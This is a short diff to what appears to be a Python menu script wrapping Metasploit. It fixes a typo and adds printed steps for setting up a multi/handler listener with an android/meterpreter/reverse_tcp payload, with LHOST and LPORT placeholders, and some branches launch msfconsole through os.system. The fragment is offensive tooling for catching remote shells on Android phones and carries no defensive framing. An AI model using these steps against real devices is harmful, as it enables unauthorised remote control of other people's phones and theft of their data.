@@ -49,6 +49,6 @@ if inp1=="2":
 elif inp1=="1":
     os.system('msfconsole')
 if inp2=="2":
-    print('1- use exploit/multi/handle')
+    print('1- use exploit/multi/handler\n2- set PAYLOAD android/meterpreter/reverse_tcp\n3- set LHOST <IP>\n4- set LPORT <port>\n5- run')
 elif inp2=="1":
     os.system('msfconsole')
